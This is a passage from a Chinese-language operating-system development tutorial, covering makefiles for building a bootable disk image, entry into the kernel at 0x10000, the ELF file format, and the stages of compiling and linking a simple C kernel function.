class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">BUILD:=../build</span><br><span class="line">SRC:=.</span><br><span class="line"></span><br><span class="line">ENTRYPOINT:=0x10000</span><br><span class="line"></span><br><span class="line"><span class="variable">$(BUILD)</span>/boot/%.bin: <span class="variable">$(SRC)</span>/boot/%.asm</span><br><span class="line"><span class="variable">$(<span class="built_in">shell</span> mkdir -p $(<span class="built_in">dir</span> <span class="variable">$@</span>)</span>)</span><br><span class="line">nasm -f bin <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(BUILD)</span>/kernel/%.o: <span class="variable">$(SRC)</span>/kernel/%.asm</span><br><span class="line"><span class="variable">$(<span class="built_in">shell</span> mkdir -p $(<span class="built_in">dir</span> <span class="variable">$@</span>)</span>) </span><br><span class="line">nasm -f elf32 <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(BUILD)</span>/kernel.bin: <span class="variable">$(BUILD)</span>/kernel/start.o</span><br><span class="line"><span class="variable">$(<span class="built_in">shell</span> mkdir -p $(<span class="built_in">dir</span> <span class="variable">$@</span>)</span>) </span><br><span class="line">ld -m elf_i386 -static <span class="variable">$^</span> -o <span class="variable">$@</span> -Ttext <span class="variable">$(ENTRYPOINT)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(BUILD)</span>/system.bin: <span class="variable">$(BUILD)</span>/kernel.bin</span><br><span class="line">objcopy -O binary <span class="variable">$&lt;</span> <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(BUILD)</span>/system.map: <span class="variable">$(BUILD)</span>/kernel.bin</span><br><span class="line">nm <span class="variable">$&lt;</span> | sort &gt; <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(BUILD)</span>/master.img: <span class="variable">$(BUILD)</span>/boot/boot.bin \</span><br><span class="line"><span class="variable">$(BUILD)</span>/boot/loader.bin \</span><br><span class="line"><span class="variable">$(BUILD)</span>/system.bin \</span><br><span class="line"><span class="variable">$(BUILD)</span>/system.map \</span><br><span class="line"></span><br><span class="line">yes | bximage -hd -mode=<span class="string">&quot;flat&quot;</span> -size=60 -q <span class="variable">$(BUILD)</span>/master.img</span><br><span class="line">dd if=<span class="variable">$(BUILD)</span>/boot/boot.bin of=<span class="variable">$@</span> bs=512 count=1 conv=notrunc</span><br><span class="line">dd if=<span class="variable">$(BUILD)</span>/boot/loader.bin of=<span class="variable">$@</span> bs=512 count=4 seek=2 conv=notrunc</span><br><span class="line">dd if=<span class="variable">$(BUILD)</span>/system.bin of=<span class="variable">$@</span> bs=512 count=200 seek=10 conv=notrunc</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm -rf <span class="variable">$(BUILD)</span>/*</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: usb</span></span><br><span class="line"><span class="section">usb: <span class="variable">$(BUILD)</span>/boot/boot.bin /dev/sdb</span></span><br><span class="line">sudo dd if=/dev/sdb of=tmp.bin bs=512 count=1 conv=notrunc</span><br><span class="line">cp tmp.bin usb.bin</span><br><span class="line">sudo rm tmp.bin</span><br><span class="line">dd if=<span class="variable">$(BUILD)</span>/boot/boot.bin of=usb.bin bs=446 count=1 conv=notrunc</span><br><span class="line">sudo dd if=usb.bin of=/dev/sdb bs=512 count=1 conv=notrunc</span><br><span class="line">rm usb.bin</span><br><span class="line"></span><br><span class="line"><span class="section">test: <span class="variable">$(BUILD)</span>/master.img</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: bochs</span></span><br><span class="line"><span class="section">bochs: <span class="variable">$(BUILD)</span>/master.img</span></span><br><span class="line">bochs -q</span><br></pre></td></tr></table></figure><p>在<code>bochsrc</code>配置里面注意更改硬盘的path配置为 <strong>…/build/master.img</strong></p><h2 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h2><p><code>src/kernel/start.asm</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[bits 32]</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">    mov byte [0xb8000], &#x27;k&#x27;; 表示进入了内核</span><br></pre></td></tr></table></figure><hr /><p><code>src/boot/loader.asm</code></p><p>在protect_mode里面添加，调整栈帧后，使用代码选择子跳转到0x10000内存执行start.asm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov esp, 0x10000; 栈顶</span><br><span class="line">mov edi, 0x10000  ; 读到的目标内存</span><br><span class="line">mov ecx, 10       ; 起始扇区</span><br><span class="line">mov bl,200         ;扇区数量</span><br><span class="line">call read_disk</span><br><span class="line">; xchg bx, bx</span><br><span class="line">jmp dword code_selector:0x10000</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/6aae6954a206e197cc6d27d674f07488.png" alt="image-20220226112427845" /></p><p>在目标内存地址(<strong>0x10000</strong>)找到kernel.bin的二进制代码</p><h1 id="操作系统实现-elf文件格式"><a class="markdownIt-Anchor" href="#操作系统实现-elf文件格式"></a> 操作系统实现-ELF文件格式</h1><p>这个对CTFpwner来说比较简单</p><p><strong>ELF的三种格式</strong></p><p><img src="https://img.joe1sn.top/uploads/big/68b93ddb7a923c8953d6103c9f218c5d.png" alt="" /></p><p><strong>可重定位文件（Relocatable file）</strong></p><ul><li>包含了代码和数据，可以和其他目标文件链接生成一个可执行文件或共享 目标文件。</li></ul><p><strong>可执行文件（Executable File）</strong></p><ul><li>包含了可以直接执行的文件。</li></ul><p><strong>共享目标文件（Shared Object File）</strong></p><ul><li>包含了用于链接的代码和数据，分两种情况。一种是链接器将其与其他的 可重定位文件和共享目标文件链接起来，生产新的目标文件。另一种是动 态链接器将多个共享目标文件与可执行文件结合，作为进程映像的一部 分</li></ul><h2 id="内核的文件格式可执行程序"><a class="markdownIt-Anchor" href="#内核的文件格式可执行程序"></a> 内核的文件格式：可执行程序</h2><ol><li>代码段 <strong>.text section</strong>(ELF文件段)| segment CPU</li><li>数据<ol><li><strong>.data</strong> section：已经初始化过后的数据</li><li><strong>.bss</strong>(Block Started by Symbol)：未初始化过的数据</li></ol></li></ol><p><strong>程序分析</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 hello.c -o hello</span><br></pre></td></tr></table></figure><p>使用readelf objdump IDA_PRO等查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -e hello</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/acb1a493cd2885fc04d50894805b403a.png" alt="image-20220226210155881" /></p><h2 id="相关资料"><a class="markdownIt-Anchor" href="#相关资料"></a> 相关资料</h2><p><a href="https://ctf-wiki.org/executable/elf/structure/basic-info/?h=elf#elf-header">CTF-WIKI ELF 文件</a></p><h1 id="操作系统实现-编译链接与数据类型"><a class="markdownIt-Anchor" href="#操作系统实现-编译链接与数据类型"></a> 操作系统实现-编译链接与数据类型</h1><h2 id="编译链接"><a class="markdownIt-Anchor" href="#编译链接"></a> 编译链接</h2><p><img src="https://img.joe1sn.top/uploads/big/e0fc3a834c630bdc9890bb1cbba92fd5.png" alt="image-20220227200844559" /></p><p>当GCC编译程序的时候会经历上述几步：</p><p>我们在项目 新建<code>src/kernel/include/xsys</code></p><p>在里面新建<code>include/xsys/xsys.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> XSYS_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XSYS_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XSYS_MAGIC 20220227</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_init</span><span class="params">()</span>; <span class="comment">//初始化内核</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>创建<code>src/kernel/main.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/xsys.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> magic = XSYS_MAGIC;         </span><br><span class="line"></span><br><span class="line"><span class="type">char</span> message[]=<span class="string">&quot;hello Xsys&quot;</span>;    <span class="comment">//.data</span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">1024</span>];                 <span class="comment">//.bss</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *video = (<span class="type">char</span> *) <span class="number">0xb8000</span>; <span class="comment">//文本显示器内存位置</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(message); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        video[i*<span class="number">2</span>]=message[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>预处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -E main.c -I ../include/ &gt; test.c</span><br></pre></td></tr></table></figure><p>这样就生成了<code>main.c</code>的与处理文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">1</span> <span class="string">&quot;main.c&quot;</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;&lt;built-in&gt;&quot;</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;&lt;command-line&gt;&quot;</span></span><br><span class="line"># <span class="number">31</span> <span class="string">&quot;&lt;command-line&gt;&quot;</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;/usr/include/stdc-predef.h&quot;</span> <span class="number">1</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"># <span class="number">32</span> <span class="string">&quot;&lt;command-line&gt;&quot;</span> <span class="number">2</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;main.c&quot;</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;../include/xsys/xsys.h&quot;</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_init</span><span class="params">()</span>;</span><br><span class="line"># <span class="number">2</span> <span class="string">&quot;main.c&quot;</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> magic = <span class="number">20220227</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> message[]=<span class="string">&quot;hello Xsys&quot;</span>;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *video = (<span class="type">char</span> *) <span class="number">0xb8000</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(message); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        video[i*<span class="number">2</span>]=message[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -S test.c &gt; test.s</span><br></pre></td></tr></table></figure><p>得到C转汇编的源代码文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">.file&quot;test.c&quot;</span><br><span class="line">.text</span><br><span class="line">.globlmagic</span><br><span class="line">.data</span><br><span class="line">.align 4</span><br><span class="line">.typemagic, @object</span><br><span class="line">.sizemagic, 4</span><br><span class="line">magic:</span><br><span class="line">.long20220227</span><br><span class="line">.globlmessage</span><br><span class="line">.align 4</span><br><span class="line">.typemessage, @object</span><br><span class="line">.sizemessage, 11</span><br><span class="line">message:</span><br><span class="line">.string&quot;hello Xsys&quot;</span><br><span class="line">.commbuf,1024,32</span><br><span class="line">.text</span><br><span class="line">.globlkernel_init</span><br><span class="line">.typekernel_init, @function</span><br><span class="line">kernel_init:</span><br><span class="line">.LFB0:</span><br><span class="line">.cfi_startproc</span><br><span class="line">pushl%ebp</span><br><span class="line">.cfi_def_cfa_offset 8</span><br><span class="line">.cfi_offset 5, -8</span><br><span class="line">movl%esp, %ebp</span><br><span class="line">.cfi_def_cfa_register 5</span><br><span class="line">pushl%ebx</span><br><span class="line">subl$16, %esp</span><br><span class="line">.cfi_offset 3, -12</span><br><span class="line">call__x86.get_pc_thunk.ax</span><br><span class="line">addl$_GLOBAL_OFFSET_TABLE_, %eax</span><br><span class="line">movl$753664, -8(%ebp)</span><br><span class="line">movl$0, -12(%ebp)</span><br><span class="line">jmp.L2</span><br><span class="line">.L3:</span><br><span class="line">movl-12(%ebp), %edx</span><br><span class="line">addl%edx, %edx</span><br><span class="line">movl%edx, %ecx</span><br><span class="line">movl-8(%ebp), %edx</span><br><span class="line">addl%edx, %ecx</span><br><span class="line">lealmessage@GOTOFF(%eax), %ebx</span><br><span class="line">movl-12(%ebp), %edx</span><br><span class="line">addl%ebx, %edx</span><br><span class="line">movzbl(%edx), %edx</span><br><span class="line">movb%dl, (%ecx)</span><br><span class="line">addl$1, -12(%ebp)</span><br><span class="line">.L2:</span><br><span class="line">movl-12(%ebp), %edx</span><br><span class="line">cmpl$10, %edx</span><br><span class="line">jbe.L3</span><br><span class="line">nop</span><br><span class="line">addl$16, %esp</span><br><span class="line">popl%ebx</span><br><span class="line">.cfi_restore 3</span><br><span class="line">popl%ebp</span><br><span class="line">.cfi_restore 5</span><br><span class="line">.cfi_def_cfa 4, 4</span><br><span class="line">ret</span><br><span class="line">.cfi_endproc</span><br><span class="line">.LFE0:</span><br><span class="line">.sizekernel_init, .-kernel_init</span><br><span class="line">.section.text.__x86.get_pc_thunk.ax,&quot;axG&quot;,@progbits,__x86.get_pc_thunk.ax,comdat</span><br><span class="line">.globl__x86.get_pc_thunk.ax</span><br><span class="line">.hidden__x86.get_pc_thunk.ax</span><br><span class="line">.type__x86.get_pc_thunk.ax, @function</span><br><span class="line">__x86.get_pc_thunk.ax:</span><br><span class="line">.LFB1:</span><br><span class="line">.cfi_startproc</span><br><span class="line">movl(%esp), %eax</span><br><span class="line">ret</span><br><span class="line">.cfi_endproc</span><br><span class="line">.LFE1:</span><br><span class="line">.ident&quot;GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0&quot;</span><br><span class="line">.section.note.GNU-stack,&quot;&quot;,@progbits</span><br></pre></td></tr></table></figure></li><li><p>编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">as -32 test.s  -o test.o</span><br></pre></td></tr></table></figure><p>将<code>test.s</code>编译位32位的ELF文件<code>test.o</code></p><p><img src="https://img.joe1sn.top/uploads/big/35f1daf28588a9210edf4c53d4a711d6.png" alt="image-20220227201912329" /></p><p>这个时候使用readelf查看文件结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -a test.o</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/bdb4924c9b7fafe694c58bd390c7ac0f.png" alt="image-20220227202042024" /></p><p>会看到这些段都是没有地址的，当我们链接才能找到准确的地址</p><p><img src="https://img.joe1sn.top/uploads/big/f3081e58f406dfd89b110ffbafa36160.png" alt="image-20220227202209131" /></p><p>同时我们的变量也加入到了符号表中</p></li><li><p>链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld -m elf_i386 -static test.o -o test.out -e kernel_init</span><br></pre></td></tr></table></figure><p>将<code>test.o</code>文件按照elf i386的格式链接到库文件，同时声明外部函数kernel_init</p><p><img src="https://img.joe1sn.top/uploads/big/d1a54cb24dc42cecf457fe97c309e1e0.png" alt="image-20220227202513855" /></p><p>这个时候已经有了Addr了，但是启动还是会出错，因为我们之前定义的是在0x10000出启动程序</p></li><li><p>gcc直接编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 main.c -I ../include/ -o main.out -e kernel_init -nostartfiles</span><br></pre></td></tr></table></figure><p>-nostartfiles：类似与windows里面的入口点不使用main</p></li></ul><p><strong>写入到操作系统</strong></p><p>添加一个<code>kernel/%.c</code>编译到<code>kernel/%.o</code>的makefile</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$(BUILD)</span>/kernel/%.o: <span class="variable">$(SRC)</span>/kernel/%.c</span><br><span class="line"><span class="variable">$(<span class="built_in">shell</span> mkdir -p $(<span class="built_in">dir</span> <span class="variable">$@</span>)</span>) </span><br><span class="line">gcc <span class="variable">$(CFLAGS)</span> <span class="variable">$(DEBUG)</span> <span class="variable">$(INCLUDE)</span> -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span> </span><br></pre></td></tr></table></figure><p>同时可以加还是那个编译参数</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DEBUG:= -g</span><br><span class="line">CFLAGS:= -m32</span><br><span class="line">INCLUDE:= -I<span class="variable">$(SRC)</span>/<span class="keyword">include</span></span><br></pre></td></tr></table></figure><p>完整的makefile如下</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">BUILD:=../build</span><br><span class="line">SRC:=.</span><br><span class="line">ENTRYPOINT:=0x10000</span><br><span class="line"></span><br><span class="line">CFLAGS:= -m32</span><br><span class="line"></span><br><span class="line">DEBUG:= -g</span><br><span class="line">INCLUDE:= -I<span class="variable">$(SRC)</span>/<span class="keyword">include</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(BUILD)</span>/boot/%.bin: <span class="variable">$(SRC)</span>/boot/%.asm</span><br><span class="line"><span class="variable">$(<span class="built_in">shell</span> mkdir -p $(<span class="built_in">dir</span> <span class="variable">$@</span>)</span>)</span><br><span class="line">nasm -f bin <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(BUILD)</span>/kernel/%.o: <span class="variable">$(SRC)</span>/kernel/%.asm</span><br><span class="line"><span class="variable">$(<span class="built_in">shell</span> mkdir -p $(<span class="built_in">dir</span> <span class="variable">$@</span>)</span>) </span><br><span class="line">nasm -f elf32 <span class="variable">$(DEBUG)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$(BUILD)</span>/kernel/%.o: <span class="variable">$(SRC)</span>/kernel/%.c</span><br><span class="line"><span class="variable">$(<span class="built_in">shell</span> mkdir -p $(<span class="built_in">dir</span> <span class="variable">$@</span>)</span>) </span><br><span class="line">gcc <span class="variable">$(CFLAGS)</span> <span class="variable">$(DEBUG)</span> <span class="variable">$(INCLUDE)</span> -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span> </span><br><span class="line"></span><br><span class="line"><span class="variable">$(BUILD)</span>/kernel.bin: <span class="variable">$(BUILD)</span>/kernel/start.o \</span><br><span class="line"> <span class="variable">$(BUILD)</span>/kernel/main.o</span><br><span class="line"></span><br><span class="line"><span class="variable">$(<span class="built_in">shell</span> mkdir -p $(<span class="built_in">dir</span> <span class="variable">$@</span>)</span>) </span><br><span class="line">ld -m elf_i386 -static <span class="variable">$^</span> -o <span class="variable">$@</span> -Ttext <span class="variable">$(ENTRYPOINT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#objcpoy加载bss段展开文件</span></span><br><span class="line"><span class="variable">$(BUILD)</span>/system.bin: <span class="variable">$(BUILD)</span>/kernel.bin</span><br><span class="line">objcopy -O binary <span class="variable">$&lt;</span> <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(BUILD)</span>/system.map: <span class="variable">$(BUILD)</span>/kernel.bin</span><br><span class="line">nm <span class="variable">$&lt;</span> | sort &gt; <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(BUILD)</span>/master.img: <span class="variable">$(BUILD)</span>/boot/boot.bin \</span><br><span class="line"><span class="variable">$(BUILD)</span>/boot/loader.bin \</span><br><span class="line"><span class="variable">$(BUILD)</span>/system.bin \</span><br><span class="line"><span class="variable">$(BUILD)</span>/system.map \</span><br><span class="line"></span><br><span class="line">yes | bximage -hd -mode=<span class="string">&quot;flat&quot;</span> -size=60 -q <span class="variable">$(BUILD)</span>/master.img</span><br><span class="line">dd if=<span class="variable">$(BUILD)</span>/boot/boot.bin of=<span class="variable">$@</span> bs=512 count=1 conv=notrunc</span><br><span class="line">dd if=<span class="variable">$(BUILD)</span>/boot/loader.bin of=<span class="variable">$@</span> bs=512 count=4 seek=2 conv=notrunc</span><br><span class="line">dd if=<span class="variable">$(BUILD)</span>/system.bin of=<span class="variable">$@</span> bs=512 count=200 seek=10 conv=notrunc</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm -rf <span class="variable">$(BUILD)</span>/*</span><br><span class="line"></span><br><span class="line"><span class="section">test: <span class="variable">$(BUILD)</span>/master.img</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: bochs</span></span><br><span class="line"><span class="section">bochs: <span class="variable">$(BUILD)</span>/master.img</span></span><br><span class="line">bochs -q</span><br></pre></td></tr></table></figure><p>再修改下<code>kernel/start.asm</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[bits 32]</span><br><span class="line"></span><br><span class="line">extern kernel_init</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">    ; mov byte [0xb8000], &#x27;k&#x27;; 表示进入了内核</span><br><span class="line">    xchg bx, bx</span><br><span class="line">    call kernel_init</span><br><span class="line">    xchg bx, bx</span><br><span class="line"></span><br><span class="line">    jmp $</span><br></pre></td></tr></table></figure><p><strong>make test</strong>一下没问题后<strong>make clean</strong>再<strong>make bochs</strong>调试</p><p><img src="https://img.joe1sn.top/uploads/big/d3ebe55d2646cf8fc96645f7b1551d03.png" alt="image-20220227203208750" /></p><p>进入<code>kernel_init</code></p><p><img src="https://img.joe1sn.top/uploads/big/fdefbdb6473743c6e3a1218c6a362548.png" alt="image-20220227203253923" /></p><p>显示输出被覆盖，说明调用成功</p><h2 id="数据类型"><a class="markdownIt-Anchor" href="#数据类型"></a> 数据类型</h2><p>在操作系统中，数据类型都是被定义好的</p><p>新建<code>include/xsys/types.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 